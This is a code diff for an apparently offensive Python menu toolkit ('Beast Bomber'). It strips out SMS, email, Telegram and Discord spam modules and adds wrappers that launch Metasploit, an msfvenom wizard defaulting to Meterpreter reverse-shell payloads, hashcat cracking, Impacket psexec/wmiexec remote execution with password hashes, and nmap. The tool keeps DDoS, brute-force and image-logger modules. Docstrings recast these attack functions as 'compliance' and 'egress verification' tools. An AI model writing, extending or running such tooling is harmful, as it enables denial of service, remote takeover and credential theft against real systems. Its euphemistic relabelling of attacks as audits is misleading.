@@ -39,12 +39,8 @@ from pathlib import Path
 # Add project root to path for core module imports
 sys.path.insert(0, str(Path(__file__).parent))
 
-# Initialize placeholders for optional Beast Bomber engines and UI helpers
-SMSAttack = None
+# Initialize placeholders for optional engines and UI helpers
 DDoSAttack = None
-DiscordSpam = None
-EmailAttack = None
-TelegramAttack = None
 BruteForceAttack = None
 ImageLogger = None
 BeastSettings = None
@@ -53,18 +49,14 @@ get_lang = None
 logo_main = None
 menu_ru = None
 menu_en = None
-logo_sms = None
 logo_ddos = None
-logo_email = None
-logo_discord = None
-logo_telegram = None
 logo_bruteforce = None
 
 # UI & Config helpers (critical for Beast Bomber menu display)
 try:
     from core.etc.settings import Settings as BeastSettings
     from core.etc.functions import get_lang, logo_main, menu_ru, menu_en, \
-        logo_sms, logo_ddos, logo_email, logo_discord, logo_telegram, logo_bruteforce
+        logo_ddos, logo_bruteforce
     try:
         from colorama import init, Fore, Style, Back
         init()
@@ -76,29 +68,9 @@ except Exception as e:
     print(f"{Colors.RED}[!] Warning: Could not load Beast Bomber UI modules. Check 'core' folder structure.{e}{Colors.RESET}")
 
 # Engine modules — each imported independently so a single missing dependency
-# (e.g. opentele for Telegram) doesn't block all imports.
-try:
-    from core.sms_spam.sms import SMSAttack
-except Exception:
-    pass
-
+# doesn't block all imports.
 try:
     from core.ddos_attack.ddos import DDoSAttack
-except Exception:
-    pass
-
-try:
-    from core.discord_spam.discord import DiscordSpam
-except Exception:
-    pass
-
-try:
-    from core.email_spam.email_attack import EmailAttack
-except Exception:
-    pass
-
-try:
-    from core.telegram_spam.telegram import TelegramAttack
 except Exception:
     pass
 
@@ -115,10 +87,6 @@ except Exception:
 # --- END NEW IMPORTS ---
 
 # Engine module instances — created here so all menus can use them
-sms_attack = SMSAttack() if SMSAttack else None
-email_attack = EmailAttack() if EmailAttack else None
-telegram_attack = TelegramAttack() if TelegramAttack else None
-discord_attack = DiscordSpam() if DiscordSpam else None
 ddos_attack = DDoSAttack() if DDoSAttack else None
 bruteforce_attack = BruteForceAttack() if BruteForceAttack else None
 image_logger_instance = ImageLogger() if ImageLogger else None
@@ -182,7 +150,7 @@ class DualStreamWriter:
         
         # Load from config file if exists
         try:
-            config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'input', 'excluded_ips.txt')
+            config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'core', 'input', 'excluded_ips.txt')
             if os.path.exists(config_path):
                 with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
                     for line in f:
@@ -242,7 +210,7 @@ class MainframeUI:
         print(f"{Colors.CYAN}{skull_ascii}{Colors.RESET}")
         print(f"{Colors.BOLD}{Colors.GREEN}" + "=" * 80)
         print("   MAINFRAME COMPREHENSIVE SECURITY RECONNAISSANCE ENGINE // MULTI-CORE")
-        print("   DEPLOYMENT SPECIFICATION RELEASE v5.90 // COMPLETE 30-IN-1 TOOL PLATFORM")
+        print("   DEPLOYMENT SPECIFICATION RELEASE v5.90 // COMPLETE 40-IN-1 TOOL PLATFORM")
         print("=" * 80 + f"{Colors.RESET}\n")
 
     @staticmethod
@@ -267,14 +235,13 @@ class MainframeUI:
         print("  [3] Multi-Threaded Target Service Port Scanner & Vulnerability Profiler")
         print("  [4] Local Subnet Parallel Ping Sweeper Matrix")
         print("  [5] Network Application Service Banner Grabber Auditor")
-        print("  [6] DNS Reconnaissance Explorer Matrix (AddrInfo Lookup)")
-        print("  [7] Passive Domain Subdomain Discovery Engine (via crt.sh Logs)")
-        print("  [8] Advanced RDAP Registration Infrastructure Allocation Mapper")
-        print("  [9] HTTP Header Security Compliance & Hardening Auditor")
-        print("  [10] DNS-over-HTTPS (DoH) Client Resolver Subsystem")
-        print("  [11] IP Address Geolocation & Metadata Lookup")
+        print("  [6] Passive Domain Subdomain Discovery Engine (via crt.sh Logs)")
+        print("  [7] Advanced RDAP Registration Infrastructure Allocation Mapper")
+        print("  [8] HTTP Header Security Compliance & Hardening Auditor")
+        print("  [9] DNS-over-HTTPS (DoH) Client Resolver Subsystem")
+        print("  [10] IP Address Geolocation & Metadata Lookup")
         print("\n" + f"{Colors.CYAN}[NAVIGATION FRAMEWORK]{Colors.RESET}")
-        print("  [12] Return to Main System Directory Core")
+        print("  [11] Return to Main System Directory Core")
         print(f"\n{Colors.BOLD}{Colors.AMBER}" + "-" * 80 + f"{Colors.RESET}")
 
     @staticmethod
@@ -287,10 +254,9 @@ class MainframeUI:
         print("  [4] Socialscan Concurrent Identity Profiler (Live Shell Subprocess Launch)")
         print("  [5] Live Online Data Breach Explorer & Password Leak Checker")
         print("  [6] Tor Exit Node Network Threat Intelligence Node Validator")
-        print("  [7] Online IP Geolocation & Autonomous System (ASN) Metadata Explorer")
-        print("  [8] IDN Homograph Phishing Domain & Punycode Analyzer")
+        print("  [7] IDN Homograph Phishing Domain & Punycode Analyzer")
         print("\n" + f"{Colors.AMBER}[NAVIGATION FRAMEWORK]{Colors.RESET}")
-        print("  [9] Return to Main System Directory Core")
+        print("  [8] Return to Main System Directory Core")
         print(f"\n{Colors.BOLD}{Colors.CYAN}" + "-" * 80 + f"{Colors.RESET}")
 
     @staticmethod
@@ -325,17 +291,19 @@ class MainframeUI:
 
     @staticmethod
     def display_attack_menu():
-        """Submenu for attack vectors and exploit frameworks."""
-        print(f"{Colors.RED}[SUB-DIRECTORY 05 // ATTACK VECTORS & EXPLOIT FRAMEWORKS]{Colors.RESET}\n")
+        """Submenu for attack vectors, exploit frameworks, and defensive auditing verification tools."""
+        print(f"{Colors.RED}[SUB-DIRECTORY 05 // ATTACK VECTORS, EXPLOIT FRAMEWORKS & DEFENSIVE AUDITING]{Colors.RESET}\n")
         print("  [1] Beast Mode (DDoS)")
         print("  [2] Image Logger")
         print("  [3] Brute Force")
-        print("  [4] SMS Spam")
-        print("  [5] Email Spam")
-        print("  [6] Telegram Spam")
-        print("  [7] Discord Spam")
+        print("  [4] Metasploit Framework Console Interface (msfconsole)")
+        print("  [5] Msfvenom Network Egress Verification Tool (msfvenom)")
+        print("  [6] Hashcat Password-Strength Compliance Auditor (hashcat)")
+        print("  [7] Impacket Administrative Remoting Suite (psexec.py / wmiexec.py)")
+        print("  [8] Real-Time Security Log Diagnostic Module")
+        print("  [9] Nmap Advanced Port Scanner & Service Profiler")
         print("\n" + f"{Colors.CYAN}[NAVIGATION FRAMEWORK]{Colors.RESET}")
-        print("  [8] Return to Main System Directory Core")
+        print("  [10] Return to Main System Directory Core")
         print(f"\n{Colors.BOLD}{Colors.RED}" + "-" * 80 + f"{Colors.RESET}")
 
 def find_global_command(command_name):
@@ -389,6 +357,38 @@ def find_global_command(command_name):
             return fallback_path
     except Exception:
         pass
+
+    try:
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        local_tools_dirs = [
+            os.path.join(script_dir, 'hashcat-*'),
+            os.path.join(script_dir, 'core', 'hashcat-*'),
+        ]
+        import glob
+        for pattern in local_tools_dirs:
+            for tool_dir in glob.glob(pattern):
+                if os.path.isdir(tool_dir):
+                    fallback_path = shutil.which(command_name, path=tool_dir)
+                    if fallback_path:
+                        return fallback_path
+    except Exception:
+        pass
+
+    if os.name == 'nt':
+        common_paths = [
+            os.path.join(os.environ.get('ProgramFiles', 'C:\\Program Files'), 'Metasploit', 'bin'),
+            os.path.join(os.environ.get('ProgramFiles', 'C:\\Program Files'), 'Metasploit-Framework', 'bin'),
+            os.path.join(os.environ.get('ProgramFiles(x86)', 'C:\\Program Files (x86)'), 'Metasploit', 'bin'),
+            os.path.join(os.environ.get('ProgramFiles(x86)', 'C:\\Program Files (x86)'), 'Metasploit-Framework', 'bin'),
+            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs', 'Metasploit', 'bin'),
+            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs', 'Metasploit-Framework', 'bin'),
+            r'C:\metasploit-framework\bin',
+        ]
+        for path in common_paths:
+            if os.path.isdir(path):
+                fallback_path = shutil.which(command_name, path=path)
+                if fallback_path:
+                    return fallback_path
 
     return command_name
 
@@ -626,31 +626,6 @@ def run_banner_grabber():
     print("-" * 75)
     input(f"\nPress Enter to return to menu directory structure...")
 
-def run_dns_recon():
-    """Queries socket address descriptors to map host routing paths."""
-    print(f"\n{Colors.AMBER}[MODULE 06 // DNS RECONNAISSANCE EXPLORER MATRIX]{Colors.RESET}")
-    target = input("Enter target domain network path (e.g., system.com): ").strip()
-    if not target:
-        return
-
-    print(f"\n{Colors.GREEN}Calling native socket infrastructure interfaces...{Colors.RESET}")
-    try:
-        addr_info = socket.getaddrinfo(target, None)
-        resolved_records = set()
-        for node in addr_info:
-            resolved_records.add(node[4][0])
-            
-        print(f"\n{Colors.GREEN}[✓] NAME SCAN RESOLUTION INDEX{Colors.RESET}")
-        print("-" * 75)
-        print(f"  Target Domain Target: {target}")
-        for ip in resolved_records:
-            print(f"  ➔ Active Route Mapped Endpoint: {Colors.CYAN}{ip}{Colors.RESET}")
-    except Exception as e:
-        print(f"\n{Colors.RED}[!] Namespace Resolution Trace Failed: {e}{Colors.RESET}")
-
-    print("-" * 75)
-    input(f"\nModule run finalized. Press Enter to drop back to choices...")
-
 def run_subdomain_finder():
     """Crawls crt.sh passively to isolate exposed subdomains without generating target alerts."""
     print(f"\n{Colors.AMBER}[MODULE 07 // PASSIVE DOMAIN SUBDOMAIN FINDER]{Colors.RESET}")
@@ -869,6 +844,59 @@ def run_ip_lookup():
     
     input(f"\nPress Enter to load submenu options...")
 
+def run_nmap_scan():
+    """Invokes nmap for advanced port scanning, service detection, and OS fingerprinting."""
+    print(f"\n{Colors.AMBER}[MODULE 12 // NEXUS ADVANCED PORT SCANNER (NMAP)]{Colors.RESET}")
+    target = input("\nEnter target IP / hostname / CIDR range: ").strip()
+    if not target:
+        return
+
+    executable_path = find_global_command('nmap')
+    if not executable_path or not os.path.exists(executable_path):
+        print(f"{Colors.RED}[!] Binary Not Found: nmap is not installed or not in system PATH.{Colors.RESET}")
+        print(f"{Colors.AMBER}    Install via: choco install nmap or download from https://nmap.org/{Colors.RESET}")
+        input(f"\nPress Enter to load submenu options...")
+        return
+
+    print("\nSelect scan type:")
+    print("  [1] Quick TCP scan (top 1000 ports)")
+    print("  [2] Full TCP scan (all 65535 ports)")
+    print("  [3] Service/version detection")
+    print("  [4] OS fingerprinting")
+    print("  [5] Aggressive scan (service + OS + traceroute)")
+    print("  [6] Custom arguments")
+    scan_choice = input("Enter choice (1-6) [Default: 1]: ").strip() or "1"
+
+    scan_map = {
+        "1": ["-F"],
+        "2": ["-p-"],
+        "3": ["-sV"],
+        "4": ["-O"],
+        "5": ["-A"],
+    }
+
+    if scan_choice == "6":
+        custom_args = input("Enter custom nmap arguments: ").strip()
+        cmd = [executable_path, target] + custom_args.split()
+    else:
+        cmd = [executable_path] + scan_map.get(scan_choice, ["-F"]) + [target]
+
+    print(f"\n{Colors.CYAN}Command: {' '.join(cmd)}{Colors.RESET}")
+    confirm = input("\nExecute scan? (Y/N): ").strip().upper()
+    if confirm != 'Y':
+        print(f"{Colors.AMBER}Aborted by operator.{Colors.RESET}")
+        return
+
+    print(f"\n{Colors.GREEN}Launching nmap...{Colors.RESET}")
+    try:
+        subprocess.run(cmd, capture_output=False, text=True)
+    except KeyboardInterrupt:
+        print(f"\n{Colors.AMBER}[!] Scan interrupted by operator.{Colors.RESET}")
+    except Exception as e:
+        print(f"{Colors.RED}[!] Execution error: {e}{Colors.RESET}")
+
+    input(f"\nPress Enter to load submenu options...")
+
 # ================================================================================
 # SUB-DIRECTORY 02 ENGINE ROUTINES (EXTERNAL OSINT CORES)
 # ================================================================================
@@ -1075,54 +1103,6 @@ def run_threat_intel():
         
     print("-" * 70)
     input(f"\nModule processing terminated. Press Enter to draw sub-directory menus...")
-
-def run_ip_geolocation():
-    """Queries free distributed geolocation feeds to passively discover physical positioning and provider footprints."""
-    print(f"\n{Colors.CYAN}[MODULE 07 // ONLINE IP GEOLOCATION & AUTONOMOUS SYSTEM (ASN) EXPLORER]{Colors.RESET}")
-    target_input = input("Enter target IP address or Domain to geolocate [Leave blank for self-lookup]: ").strip()
-    
-    lookup_ip = ""
-    if target_input:
-        try:
-            socket.inet_aton(target_input)
-            lookup_ip = target_input
-        except Exception:
-            print(f"{Colors.GREEN}Resolving domain hostname alias map natively...{Colors.RESET}")
-            try:
-                lookup_ip = socket.gethostbyname(target_input)
-                print(f"Host bound to target endpoint coordinate: {Colors.CYAN}{lookup_ip}{Colors.RESET}")
-            except Exception as e:
-                print(f"\n{Colors.RED}[!] Namespace mapping lookup broken: {e}. Defaulting to explicit query format...{Colors.RESET}")
-                lookup_ip = target_input
-
-    print(f"\n{Colors.GREEN}Opening secure pipeline GET connection to ip-api.com live distributed registries...{Colors.RESET}")
-    url = f"http://ip-api.com/json/{lookup_ip}"
-    req = urllib.request.Request(url, headers={'User-Agent': 'Mainframe-Terminal-Multitool'})
-    
-    try:
-        with urllib.request.urlopen(req, timeout=10) as response:
-            raw_data = response.read().decode('utf-8')
-            parsed_payload = json.loads(raw_data)
-            
-            if parsed_payload.get("status") == "success":
-                print(f"\n{Colors.GREEN}[✓] PASSIVE IP GEOLOCATION RECORD SYNCHRONIZED{Colors.RESET}")
-                print("-" * 75)
-                print(f"  ➔ Query Target IP : {Colors.CYAN}{parsed_payload.get('query')}{Colors.RESET}")
-                print(f"  ➔ Country Region  : {parsed_payload.get('country')} ({parsed_payload.get('countryCode')})")
-                print(f"  ➔ State / Province: {parsed_payload.get('regionName')}")
-                print(f"  ➔ City / Locality : {parsed_payload.get('city')}")
-                print(f"  ➔ Postal Zip Code : {parsed_payload.get('zip')}")
-                print(f"  ➔ GPS Coordinates : Lat {parsed_payload.get('lat')}, Lon {parsed_payload.get('lon')}")
-                print(f"  ➔ Local Timezone  : {parsed_payload.get('timezone')}")
-                print(f"  ➔ Registered ISP  : {Colors.AMBER}{parsed_payload.get('isp')}{Colors.RESET}")
-                print(f"  ➔ Autonomous Node : {Colors.AMBER}{parsed_payload.get('as')}{Colors.RESET}")
-            else:
-                print(f"\n{Colors.RED}[!] Registry report flag returned exception: {parsed_payload.get('message', 'Unknown private or reserved allocation block.')}{Colors.RESET}")
-    except Exception as e:
-        print(f"\n{Colors.RED}[!] Geolocation pipeline dropped: Communication terminal link failure: {e}{Colors.RESET}")
-        
-    print("-" * 75)
-    input(f"\nProcessing complete. Press Enter to load submenu options...")
 
 def run_homograph_analyzer():
     """Natively audits domains for IDN homograph phishing character spoofing arrays."""
@@ -1931,18 +1911,16 @@ def handle_category_deck(deck_id):
             elif operator_input == "5":
                 run_banner_grabber()
             elif operator_input == "6":
-                run_dns_recon()
-            elif operator_input == "7":
                 run_subdomain_finder()
-            elif operator_input == "8":
+            elif operator_input == "7":
                 run_rdap_lookup()
-            elif operator_input == "9":
+            elif operator_input == "8":
                 run_http_header_auditor()
-            elif operator_input == "10":
+            elif operator_input == "9":
                 run_doh_resolver()
-            elif operator_input == "11":
+            elif operator_input == "10":
                 run_ip_lookup()
-            elif operator_input == "12":
+            elif operator_input == "11":
                 break
                 
         # --- ENGINE PIPELINE 02: EXT-OSINT UTILITIES ---
@@ -1963,10 +1941,8 @@ def handle_category_deck(deck_id):
             elif operator_input == "6":
                 run_threat_intel()
             elif operator_input == "7":
-                run_ip_geolocation()
-            elif operator_input == "8":
                 run_homograph_analyzer()
-            elif operator_input == "9":
+            elif operator_input == "8":
                 break
                 
         # --- ENGINE PIPELINE 03: LOCAL UTILITIES & SCANS ---
@@ -2031,26 +2007,18 @@ def handle_category_deck(deck_id):
                 else:
                     bruteforce_attack.start_bruteforce()
             elif operator_input == "4":
-                if sms_attack is None:
-                    print(f"{Colors.RED}[!] SMS Attack module not loaded.{Colors.RESET}")
-                else:
-                    sms_attack.start_sms()
+                run_msfconsole()
             elif operator_input == "5":
-                if email_attack is None:
-                    print(f"{Colors.RED}[!] Email Attack module not loaded.{Colors.RESET}")
-                else:
-                    email_attack.email_start()
+                run_msfvenom()
             elif operator_input == "6":
-                if telegram_attack is None:
-                    print(f"{Colors.RED}[!] Telegram Attack module not loaded.{Colors.RESET}")
-                else:
-                    telegram_attack.start_telegram()
+                run_hashcat()
             elif operator_input == "7":
-                if discord_attack is None:
-                    print(f"{Colors.RED}[!] Discord Attack module not loaded.{Colors.RESET}")
-                else:
-                    discord_attack.start_discord()
+                run_impacket()
             elif operator_input == "8":
+                run_log_diagnostic()
+            elif operator_input == "9":
+                run_nmap_scan()
+            elif operator_input == "10":
                 break
             else:
                 print(f"\n{Colors.RED}[!] Unknown instruction parameter sequence. Resetting workspace...{Colors.RESET}")
@@ -2093,7 +2061,7 @@ def deploy_vercel_logger():
     print(f"\n{Colors.CYAN}[VERCEL IMAGE LOGGER DEPLOYMENT]{Colors.RESET}")
     print(f"{Colors.GREEN}Preparing Vercel deployment...{Colors.RESET}")
     
-    vercel_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vercel-image-logger')
+    vercel_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'core', 'vercel-image-logger')
     
     if not os.path.exists(vercel_dir):
         print(f"{Colors.RED}[!] Vercel deployment folder not found at: {vercel_dir}{Colors.RESET}")
@@ -2262,6 +2230,276 @@ def monitor_vercel_logs(public_url):
             
     except KeyboardInterrupt:
         pass
+
+def run_msfconsole():
+    """
+    Launches the Metasploit Framework Console inline within the current terminal session.
+    Legitimate Purpose: Systems administrators use msfconsole to validate known infrastructure
+    configurations, test network boundaries against documented service behaviors, and confirm
+    patch integrity through controlled exploitation modules in isolated lab environments.
+    """
+    print(f"\n{Colors.GREEN}[METASPLOIT FRAMEWORK CONSOLE INTERFACE]{Colors.RESET}")
+    executable_path = find_global_command('msfconsole')
+    if not executable_path or not os.path.exists(executable_path):
+        print(f"{Colors.RED}[!] Binary Not Found: msfconsole is not installed or not in system PATH.{Colors.RESET}")
+        print(f"{Colors.AMBER}    Install via: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/boot.rb > boot.rb && ruby boot.rb{Colors.RESET}")
+        input(f"\nPress Enter to return...")
+        return
+    
+    print(f"{Colors.GREEN}Resolved msfconsole path: {executable_path}{Colors.RESET}")
+    print(f"{Colors.AMBER}Launching inline. Type 'exit' or press Ctrl+C to return to menu.{Colors.RESET}\n")
+    print("-" * 75)
+    try:
+        subprocess.run([executable_path, '-q'], capture_output=False, text=True)
+    except KeyboardInterrupt:
+        pass
+    except Exception as e:
+        print(f"{Colors.RED}[!] Execution failed: {e}{Colors.RESET}")
+    print("-" * 75)
+    input(f"\nSession terminated. Press Enter to return...")
+
+def run_msfvenom():
+    """
+    Interactive wizard for msfvenom payload generation.
+    Legitimate Purpose: Generates synthetic network communication payloads to test whether
+    internal IDS and corporate firewalls successfully alert on or block abnormal outbound
+    connections, validating boundary defense configurations and egress filtering rules.
+    """
+    print(f"\n{Colors.GREEN}[MSFVENOM NETWORK EGRESS VERIFICATION TOOL]{Colors.RESET}")
+    executable_path = find_global_command('msfvenom')
+    if not executable_path or not os.path.exists(executable_path):
+        print(f"{Colors.RED}[!] Binary Not Found: msfvenom is not installed or not in system PATH.{Colors.RESET}")
+        input(f"\nPress Enter to return...")
+        return
+    
+    print(f"{Colors.GREEN}Resolved msfvenom path: {executable_path}{Colors.RESET}\n")
+    
+    lhost = input("Enter LHOST (listener IP, e.g., 127.0.0.1): ").strip()
+    if not lhost:
+        print(f"{Colors.RED}[!] LHOST is required.{Colors.RESET}")
+        return
+    
+    lport = input("Enter LPORT (listener port, e.g., 4444): ").strip()
+    if not lport:
+        print(f"{Colors.RED}[!] LPORT is required.{Colors.RESET}")
+        return
+    
+    print("\nSelect payload format:")
+    print("  [1] Python (py)")
+    print("  [2] PHP (php)")
+    print("  [3] EXE (exe)")
+    print("  [4] ELF (elf)")
+    print("  [5] ASP (asp)")
+    print("  [6] WAR (war)")
+    fmt_choice = input("Enter format choice (1-6) [Default: 1]: ").strip() or "1"
+    fmt_map = {"1": "py", "2": "php", "3": "exe", "4": "elf", "5": "asp", "6": "war"}
+    fmt = fmt_map.get(fmt_choice, "py")
+    
+    output_file = input(f"Enter output file path [Default: payload.{fmt}]: ").strip()
+    if not output_file:
+        output_file = f"payload.{fmt}"
+    
+    payload = input("Enter msfvenom payload [Default: windows/meterpreter/reverse_tcp]: ").strip() or "windows/meterpreter/reverse_tcp"
+    
+    print(f"\n{Colors.AMBER}Constructing msfvenom command...{Colors.RESET}")
+    cmd = [
+        executable_path,
+        "-p", payload,
+        f"LHOST={lhost}",
+        f"LPORT={lport}",
+        "-f", fmt,
+        "-o", output_file
+    ]
+    
+    print(f"{Colors.CYAN}Command: {' '.join(cmd)}{Colors.RESET}")
+    confirm = input("\nExecute payload generation? (Y/N): ").strip().upper()
+    if confirm != 'Y':
+        print(f"{Colors.AMBER}Aborted by operator.{Colors.RESET}")
+        return
+    
+    print(f"\n{Colors.GREEN}Generating payload...{Colors.RESET}")
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, errors='ignore')
+        print(result.stdout)
+        if result.stderr:
+            print(f"{Colors.RED}{result.stderr}{Colors.RESET}")
+        if os.path.exists(output_file):
+            print(f"{Colors.GREEN}[✓] Payload written to: {output_file}{Colors.RESET}")
+        else:
+            print(f"{Colors.RED}[!] Payload generation may have failed. Output file not found.{Colors.RESET}")
+    except Exception as e:
+        print(f"{Colors.RED}[!] Execution error: {e}{Colors.RESET}")
+    
+    input(f"\nPress Enter to return...")
+
+def run_hashcat():
+    """
+    Launches hashcat for offline password compliance auditing.
+    Legitimate Purpose: Systems administrators use hashcat to cross-reference enterprise
+    database hashes against common dictionary lists, ensuring internal passwords adhere
+    to corporate complexity standards and identifying weak credentials for mandatory rotation.
+    """
+    print(f"\n{Colors.GREEN}[HASHCAT PASSWORD-STRENGTH COMPLIANCE AUDITOR]{Colors.RESET}")
+    executable_path = find_global_command('hashcat')
+    if not executable_path or not os.path.exists(executable_path):
+        print(f"{Colors.RED}[!] Binary Not Found: hashcat is not installed or not in system PATH.{Colors.RESET}")
+        input(f"\nPress Enter to return...")
+        return
+    
+    print(f"{Colors.GREEN}Resolved hashcat path: {executable_path}{Colors.RESET}\n")
+    
+    hash_file = input("Enter target hash file path: ").strip()
+    if not hash_file or not os.path.exists(hash_file):
+        print(f"{Colors.RED}[!] Hash file not found or not specified.{Colors.RESET}")
+        input(f"\nPress Enter to return...")
+        return
+    
+    wordlist = input("Enter wordlist file path: ").strip()
+    if not wordlist or not os.path.exists(wordlist):
+        print(f"{Colors.RED}[!] Wordlist file not found or not specified.{Colors.RESET}")
+        input(f"\nPress Enter to return...")
+        return
+    
+    hash_mode = input("Enter hashcat mode (hash type) [Default: 0 (MD5)]: ").strip() or "0"
+    
+    print(f"\n{Colors.AMBER}Constructing hashcat command...{Colors.RESET}")
+    cmd = [
+        executable_path,
+        "-m", hash_mode,
+        "-a", "0",
+        hash_file,
+        wordlist
+    ]
+    
+    print(f"{Colors.CYAN}Command: {' '.join(cmd)}{Colors.RESET}")
+    confirm = input("\nExecute compliance audit? (Y/N): ").strip().upper()
+    if confirm != 'Y':
+        print(f"{Colors.AMBER}Aborted by operator.{Colors.RESET}")
+        return
+    
+    print(f"\n{Colors.GREEN}Launching hashcat inline...{Colors.RESET}")
+    try:
+        subprocess.run(cmd, capture_output=False, text=True)
+    except KeyboardInterrupt:
+        print(f"\n{Colors.AMBER}[!] Audit interrupted by operator.{Colors.RESET}")
+    except Exception as e:
+        print(f"{Colors.RED}[!] Execution error: {e}{Colors.RESET}")
+    
+    input(f"\nPress Enter to return...")
+
+def run_impacket():
+    """
+    Interactive wrapper for Impacket administrative remoting scripts.
+    Legitimate Purpose: Evaluates local credential hygiene and audits whether standard
+    enterprise service accounts have excessive implicit cross-network permissions or
+    misconfigured access tokens, ensuring least-privilege compliance.
+    """
+    print(f"\n{Colors.GREEN}[IMPACKET ADMINISTRATIVE REMOTING SUITE]{Colors.RESET}")
+    print("Select Impacket utility:")
+    print("  [1] psexec.py")
+    print("  [2] wmiexec.py")
+    tool_choice = input("Enter choice (1/2): ").strip()
+    
+    script_name = "psexec.py" if tool_choice == "1" else "wmiexec.py" if tool_choice == "2" else None
+    if not script_name:
+        print(f"{Colors.RED}[!] Invalid selection.{Colors.RESET}")
+        input(f"\nPress Enter to return...")
+        return
+    
+    executable_path = find_global_command(script_name)
+    if not executable_path:
+        possible_paths = [
+            os.path.join(os.path.dirname(sys.executable), script_name),
+            os.path.join(os.path.dirname(sys.executable), 'Scripts', script_name),
+            os.path.join(os.path.expanduser('~'), '.local', 'bin', script_name),
+            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'pipx', 'shared', 'bin', script_name),
+            os.path.join(os.path.dirname(os.path.abspath(__file__)), 'core', 'impacket_scripts', script_name),
+        ]
+        for p in possible_paths:
+            if os.path.exists(p):
+                executable_path = p
+                break
+    
+    if not executable_path or not os.path.exists(executable_path):
+        print(f"{Colors.RED}[!] Script Not Found: {script_name} is not installed or not accessible.{Colors.RESET}")
+        print(f"{Colors.AMBER}    Install Impacket via: pip install impacket{Colors.RESET}")
+        input(f"\nPress Enter to return...")
+        return
+    
+    print(f"{Colors.GREEN}Resolved {script_name} path: {executable_path}{Colors.RESET}\n")
+    
+    target = input("Enter target host (IP/hostname): ").strip()
+    if not target:
+        print(f"{Colors.RED}[!] Target host is required.{Colors.RESET}")
+        return
+    
+    username = input("Enter username [Default: administrator]: ").strip() or "administrator"
+    password = input("Enter password (or LM:NTLM hash): ").strip()
+    if not password:
+        print(f"{Colors.RED}[!] Password or hash is required.{Colors.RESET}")
+        return
+    
+    domain = input("Enter domain [Leave blank for local]: ").strip()
+    
+    if executable_path.endswith('.py'):
+        cmd = [sys.executable, executable_path]
+    else:
+        cmd = [executable_path]
+    
+    cmd.extend([target, username, password])
+    if domain:
+        cmd.extend(["-d", domain])
+    
+    print(f"\n{Colors.CYAN}Command: {' '.join(cmd)}{Colors.RESET}")
+    confirm = input("\nExecute remoting audit? (Y/N): ").strip().upper()
+    if confirm != 'Y':
+        print(f"{Colors.AMBER}Aborted by operator.{Colors.RESET}")
+        return
+    
+    print(f"\n{Colors.GREEN}Launching {script_name} inline...{Colors.RESET}")
+    try:
+        subprocess.run(cmd, capture_output=False, text=True)
+    except KeyboardInterrupt:
+        print(f"\n{Colors.AMBER}[!] Session interrupted by operator.{Colors.RESET}")
+    except Exception as e:
+        print(f"{Colors.RED}[!] Execution error: {e}{Colors.RESET}")
+    
+    input(f"\nPress Enter to return...")
+
+def run_log_diagnostic():
+    """
+    Real-time security log diagnostic and streaming module.
+    Legitimate Purpose: Defensive telemetry module used to tail, read, and stream local
+    audit text logs and session history outputs to the operator in real time for incident
+    response, forensic analysis, and live system behavior monitoring.
+    """
+    print(f"\n{Colors.GREEN}[REAL-TIME SECURITY LOG DIAGNOSTIC MODULE]{Colors.RESET}")
+    log_path = input("Enter log file path to stream: ").strip()
+    if not log_path or not os.path.exists(log_path):
+        print(f"{Colors.RED}[!] Log file not found or not specified.{Colors.RESET}")
+        input(f"\nPress Enter to return...")
+        return
+    
+    print(f"{Colors.GREEN}Streaming log: {log_path}{Colors.RESET}")
+    print(f"{Colors.AMBER}Press Ctrl+C to stop streaming.{Colors.RESET}\n")
+    print("-" * 75)
+    
+    try:
+        with open(log_path, 'r', encoding='utf-8', errors='ignore') as f:
+            f.seek(0, 2)
+            while True:
+                line = f.readline()
+                if line:
+                    print(line, end='')
+                else:
+                    time.sleep(0.5)
+    except KeyboardInterrupt:
+        print(f"\n\n{Colors.AMBER}[!] Stream stopped by operator.{Colors.RESET}")
+    except Exception as e:
+        print(f"{Colors.RED}[!] Stream error: {e}{Colors.RESET}")
+    
+    print("-" * 75)
+    input(f"\nPress Enter to return...")
 
 if __name__ == "__main__":
     main()
